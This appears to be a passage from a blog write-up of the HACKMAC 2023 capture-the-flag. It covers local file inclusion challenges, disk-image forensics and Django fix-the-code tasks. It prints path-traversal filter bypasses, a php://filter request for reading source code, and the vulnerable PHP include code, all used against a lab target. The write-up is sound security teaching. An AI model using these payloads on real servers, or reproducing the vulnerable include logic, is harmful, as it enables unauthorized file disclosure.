+</span></span></span><span class="line"><span class="cl"><span class="g">F = 9999
+</span></span></span><span class="line"><span class="cl"><span class="g">L = 1111
+</span></span></span><span class="line"><span class="cl"><span class="g">A = 2222
+</span></span></span><span class="line"><span class="cl"><span class="g">G = 5555
+</span></span></span><span class="line"><span class="cl"><span class="g">
+</span></span></span><span class="line"><span class="cl"><span class="g">    &lt;/body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="g">&lt;/html&gt;
+</span></span></span></code></pre></div><p><code>Flag1 - HACKMAC{N3ver_tru5t_G3T_param3ters!}</code></p>
+<h3 id="2-avoidance">2. Avoidance</h3>
+<p>Based on the note in flag 1, /etc/hosts might contain new information, but to do that a bypass is needed for the LFI filter. The filter allows patterns such as <code>../</code> and <code>../../</code> but <code>../../../</code> is rejected. A reasonable guess is that the code is checking for <code>../../../</code> pattern literally. That can be bypassed using LFI patterns such as: <code>../.././../../</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/index.php?view=../.././../.././../.././../.././../../etc/hosts</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">10.10.227.231</span>
+</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.9</span>
+</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">PHPSESSID=gb09qc0o420fbfmi9lhns77970</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+</span></span><span class="line"><span class="cl"><span class="err">...</span>
+</span></span><span class="line"><span class="cl"><span class="g">
+</span></span></span><span class="line"><span class="cl"><span class="g">127.0.0.1 localhost
+</span></span></span><span class="line"><span class="cl"><span class="g">127.0.1.1 infotato
+</span></span></span><span class="line"><span class="cl"><span class="g">
+</span></span></span><span class="line"><span class="cl"><span class="g"># The following lines are desirable for IPv6 capable hosts
+</span></span></span><span class="line"><span class="cl"><span class="g">::1     ip6-localhost ip6-loopback
+</span></span></span><span class="line"><span class="cl"><span class="g">fe00::0 ip6-localnet
+</span></span></span><span class="line"><span class="cl"><span class="g">ff00::0 ip6-mcastprefix
+</span></span></span><span class="line"><span class="cl"><span class="g">ff02::1 ip6-allnodes
+</span></span></span><span class="line"><span class="cl"><span class="g">ff02::2 ip6-allrouters
+</span></span></span><span class="line"><span class="cl"><span class="g">
+</span></span></span><span class="line"><span class="cl"><span class="g">Flag2 - HACKMAC{Bypass1ng_Y0ur_tr1vial_Rulez}
+</span></span></span><span class="line"><span class="cl"><span class="g">
+</span></span></span><span class="line"><span class="cl"><span class="g">#The rules here all seem to be working. By the way I&#39;ve updated the PHP source code a bit. Please read and review to see some important changes
+</span></span></span><span class="line"><span class="cl"><span class="g">    &lt;/body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="g">&lt;/html&gt;
+</span></span></span></code></pre></div><h3 id="3-translation-required">3. Translation Required</h3>
+<p>Based on the hint in <code>Avoidance</code>, the next information can be found in the source code of index.php. When trying to view the index.php file using LFI payload like the two challenges above, it keeps rendering itself and the response becomes too large in Burp. This indicates that it is using include to render whatever the content in view parameter is. An alternative way is to use PHP streamwrapper to get the content of index.php instead:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/index.php?view=php://filter/convert.base64-encode/resource=index.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">127.0.1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">X-Forwarded-For</span><span class="o">:</span> <span class="l">infotato</span>
+</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.9</span>
+</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">PHPSESSID=gb09qc0o420fbfmi9lhns77970</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="g">...
+</span></span></span><span class="line"><span class="cl"><span class="g">PD9waHAKc2Vzc2lvbl9zdGFydCgpOwo/Pgo8aHRtbD4KICAgIDxoZWFkPgoJPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgaHJlZj0ic3R5bGUuY3NzIj4KICAgIDwvaGVhZD4KICAgIDxib2R5PgoJPGRpdiBjbGFzcz0ibWVudSI+CgkgICAgPGEgaHJlZj0iaW5kZXgucGhwIj5NYWluIFBhZ2U8L2E+CgkgICAgPGEgaHJlZj0iaW5kZXgucGhwP3ZpZXc9YWJvdXQtdXMuaHRtbCI+QWJvdXQgVXM8L2E+CgkgICAgPGEgaHJlZj0iaW5kZXgucGhwP3ZpZXc9Y29udGFjdC11cy5odG1sIj5Db250YWN0PC9hPgoJPC9kaXY+Cjw/cGhwCi8vRmxhZyAzIC0gSEFDS01BQ3tQSFBfRmlsdDNyc19hcmVfZnVuIX0KLy9UaGVzZSBjaGFuZ2VzIGxvb2sgZ3JlYXQhIEkgY2FuIHNlZSB5b3UndmUgbWFkZSBlZmZvcnRzIHRvIHN0b3AgZGlyZWN0b3J5IHRyYXZlcnNhbCA6KQovL0luY2FzZSBhbnlvbmUgZG9lcyBtYW5hZ2UgdG8gYnlwYXNzIHRoZXNlIEkndmUgcGxhY2VkIHRoZSB0cnVseSBzZWNyZXQgZGF0YSBpbiBhIGhpZGRlbiBkaXJlY3RvcnkKCmlmKCFpc3NldCgkX0dFVFsndmlldyddKSB8fCAoJF9HRVRbJ3ZpZXcnXT09ImluZGV4LnBocCIpKSB7CiAgIGVjaG8gIjxwPjxiPldlbGNvbWUgdG8gdGhlIGJldGEgdGVzdCBvZiBQLkguUC5LLkUuSy5XITwvYj48YnI+QWxsIHN5c3RlbXMgYXJlIGN1cnJlbnRseSBzaG93aW5nIGFzIG9ubGluZSBhbmQgdW5wd25lZCE8L3A+IjsKfQplbHNlaWYgKHN0cnBvcygkX0dFVFsndmlldyddLCAiLi4vLi4vLi4vIikgIT09IGZhbHNlKSB7CgllY2hvICJTdGF5IGF3YXkgZnJvbSB0aGUgb3RoZXIgZmlsZXMgPjooIjsKfQplbHNlaWYgKHN0cnBvcygkX0dFVFsndmlldyddLCAicGhwOi8vIikgPT09IDApIHsKCWVjaG8gZmlsZV9nZXRfY29udGVudHMoJF9HRVRbJ3ZpZXcnXSk7Cn0KZWxzZSB7CglpbmNsdWRlKCIvdmFyL3d3dy9odG1sLyIgLiRfR0VUWyd2aWV3J10pOwp9Cj8
+</span></span></span><span class="line"><span class="cl"><span class="g">...
+</span></span></span></code></pre></div><p>Decode the base64 response:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">...
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php
+</span></span></span><span class="line"><span class="cl"><span class="err">//Flag 3 - HACKMAC{PHP_Filt3rs_are_fun!}
+</span></span></span><span class="line"><span class="cl"><span class="err">//These changes look great! I can see you&#39;ve made efforts to stop directory traversal :)
+</span></span></span><span class="line"><span class="cl"><span class="err">//Incase anyone does manage to bypass these I&#39;ve placed the truly secret data in a hidden directory
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">if(!isset($_GET[&#39;view&#39;]) || ($_GET[&#39;view&#39;]==&#34;index.php&#34;)) {
+</span></span></span><span class="line"><span class="cl"><span class="err">   echo &#34;&lt;p&gt;&lt;b&gt;Welcome to the beta test of P.H.P.K.E.K.W!&lt;/b&gt;&lt;br&gt;All systems are currently showing as online and unpwned!&lt;/p&gt;&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="err">}
+</span></span></span><span class="line"><span class="cl"><span class="err">elseif (strpos($_GET[&#39;view&#39;], &#34;../../../&#34;) !== false) {
+</span></span></span><span class="line"><span class="cl"><span class="err">	echo &#34;Stay away from the other files &gt;:(&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="err">}
+</span></span></span><span class="line"><span class="cl"><span class="err">elseif (strpos($_GET[&#39;view&#39;], &#34;php://&#34;) === 0) {
+</span></span></span><span class="line"><span class="cl"><span class="err">	echo file_get_contents($_GET[&#39;view&#39;]);
+</span></span></span><span class="line"><span class="cl"><span class="err">}
+</span></span></span><span class="line"><span class="cl"><span class="err">else {
+</span></span></span><span class="line"><span class="cl"><span class="err">	include(&#34;/var/www/html/&#34; .$_GET[&#39;view&#39;]);
+</span></span></span><span class="line"><span class="cl"><span class="err">}
+</span></span></span><span class="line"><span class="cl"><span class="err">?&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;/body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/html&gt;
+</span></span></span></code></pre></div><p><code>Flag 3 - HACKMAC{PHP_Filt3rs_are_fun!}</code></p>
+<h2 id="forensics">Forensics</h2>
+<h3 id="1-lost-in-installation">1. Lost in Installation</h3>
+<p>On examining the disk image, by searching for HACKMAC keywords, we can get two flags. One is for this challenge:
+<img src="../image/hackmac2023/1698019544350.png" alt="1698019544350"></p>
+<p>The file contains the flag is Welcome.txt:
+<code>HACKMAC{L3t5_g3T-2.w0rK}</code></p>
+<h3 id="2-lost-in-mail">2. Lost in Mail</h3>
+<p>The hint of this challenge states that the mail can be set to forward to other mails. Examining USER.DAT there was a forwarding rule set up:</p>
+<pre tabindex="0"><code>Rule00000
+Disabled
+Actions
+All Messages
+Filter By Account
+Forward 
+Togjross@hackmac.xyz[
+Inbox Rules
+Migrated
+RulesConfigDirty
+Columns
+Mail Column Info (In)
+Mail
+Welcome Message
+Attach VCard
+NotePos0
+SplitHorzPct2
+SplitVertPct2
+SplitDir
+ThreadArticles
+LocalFilter
+(Tools2d
+Outlook Express
+</code></pre><p>We only have to submit the clue on where to investigate next. The flag is:</p>
+<p><code>HACKMAC{Togjross@hackmac.xyz}</code></p>
+<h3 id="3-loss-in-redaction">3. Loss in redaction</h3>
+<p>The other flag that can be found by searching HACKMAC keyword is for this challenge. It is in the confidential.txt file.
+<img src="../image/hackmac2023/1698022059004.png" alt="1698022059004">
+Flag:
+<code>HACKMAC{iNf3CteD_FiL3}</code></p>
+<h3 id="4-lost-in-space">4. Lost in space</h3>
+<p>The hint points to a name in the achievement records in the game Space Cadet. That can be found in USER.DAT.
+<img src="../image/hackmac2023/1698022424448.png" alt="1698022424448"></p>
+<p>Flag:
+<code>HACKMAC{Ronnie-Donnie.Wilson}</code></p>
+<h2 id="secdim">SECDIM</h2>
+<h3 id="1-boeing787-pyctf">1. Boeing787-py.ctf</h3>
+<p>Fix the code in views.py to pass all the security tests and extra conditions and push to SECDIM git remote server. If all the tests passed in the remote server the flag is printed out.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">django.http</span> <span class="kn">import</span> <span class="n">HttpResponse</span><span class="p">,</span> <span class="n">Http404</span><span class="p">,</span> <span class="n">HttpResponseBadRequest</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">django.template</span> <span class="kn">import</span> <span class="n">loader</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">.utils</span> <span class="kn">import</span> <span class="n">is_optimal</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">HttpResponse</span><span class="p">(</span><span class="s2">&#34;[!] Connected to Boeing 787!&lt;br&gt;[?] Enter how many days this Boeing has been operational (1 to 248): http://localhost:8080/isoptimal?days=[1-248]: &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">isoptimal</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">days</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">GET</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;days&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">ValueError</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">HttpResponseBadRequest</span><span class="p">(</span><span class="s2">&#34;[!] Invalid input: &#39;days&#39; must be a valid integer.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">days</span> <span class="o">&lt;</span> <span class="mi">1</span> <span class="ow">or</span> <span class="n">days</span> <span class="o">&gt;</span> <span class="mi">248</span> <span class="ow">and</span> <span class="n">days</span> <span class="o">!=</span> <span class="mi">1337</span> <span class="ow">and</span> <span class="n">days</span> <span class="o">!=</span> <span class="mi">249</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">HttpResponseBadRequest</span><span class="p">(</span><span class="s2">&#34;[!] Invalid input: &#39;days&#39; must be between 1 and 248.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">days</span> <span class="o">==</span> <span class="mi">1337</span> <span class="ow">or</span> <span class="n">days</span> <span class="o">==</span> <span class="mi">249</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">HttpResponse</span><span class="p">(</span><span class="s2">&#34;[i] Reboot is required&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="n">is_optimal</span><span class="p">(</span><span class="n">days</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">res</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">HttpResponse</span><span class="p">(</span><span class="s2">&#34;[i] Reboot is required&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">reboot_days</span> <span class="o">=</span> <span class="mi">248</span> <span class="o">-</span> <span class="n">days</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">HttpResponse</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[i] System is optimal&lt;br&gt;Reboot is required in </span><span class="si">{</span><span class="n">reboot_days</span><span class="si">}</span><span class="s2"> days&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><h3 id="2-sayhello-pyctf">2. Sayhello-py.ctf</h3>
+<p>Fix the code in views.py to filter out user input so that it satisfied the security tests for XSS. Push to remote secdim git repo to get the flag after all the tests have passed:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">django.http</span> <span class="kn">import</span> <span class="n">HttpResponse</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">django.utils.html</span> <span class="kn">import</span> <span class="n">escape</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">django.utils.safestring</span> <span class="kn">import</span> <span class="n">mark_safe</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">status</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">HttpResponse</span><span class="p">(</span><span class="n">status</span><span class="o">=</span><span class="mi">200</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">HttpResponse</span><span class="p">(</span><span class="s2">&#34;Tell me who to say hello? e.g. /sayHello/?name=alice&#34;</span><span class="p">,</span> <span class="n">status</span><span class="o">=</span><span class="mi">200</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">say_hello</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">GET</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;name&#34;</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">name</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">HttpResponse</span><span class="p">(</span><span class="s2">&#34;Tell me who to say hello? e.g. /sayHello/?name=alice&#34;</span><span class="p">,</span> <span class="n">status</span><span class="o">=</span><span class="mi">200</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">escaped_name</span> <span class="o">=</span> <span class="n">escape</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">safe_html</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;&lt;h1&gt;Hello, </span><span class="si">{</span><span class="n">escaped_name</span><span class="si">}</span><span class="s1">&lt;/h1&gt;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">HttpResponse</span><span class="p">(</span><span class="n">mark_safe</span><span class="p">(</span><span class="n">safe_html</span><span class="p">),</span> <span class="n">status</span><span class="o">=</span><span class="mi">200</span><span class="p">)</span>
+</span></span></code></pre></div>
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/heckintosh" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+<a href="https://twitter.com/heckintosh_" target="_blank" rel="noopener noreferrer me"
+    title="Twitter">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z">
+    </path>
+</svg>
+</a>
+<a href="https://linkedin.com/ducanhnguyen9" target="_blank" rel="noopener noreferrer me"
+    title="Linkedin">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path>
+    <rect x="2" y="9" width="4" height="12"></rect>
+    <circle cx="4" cy="4" r="2"></circle>
+</svg>
+</a>
+<a href="mailto:heckintosh@protonmail.com" target="_blank" rel="noopener noreferrer me"
+    title="Email">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 21" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
+    <polyline points="22,6 12,13 2,6"></polyline>
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2024 D.A Nguyen.
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noreferrer noopener">Hugo blog awesome</a>
+        theme on
+        <a href="https://gohugo.io" target="_blank" rel="noreferrer noopener">Hugo</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+    
+        
+    
+
+    
+    
+        
+    
+
+
+
+    
+    <script async src="http://localhost:1313/js/main.js" ></script>
+
+    
+
+</body>
+</html>
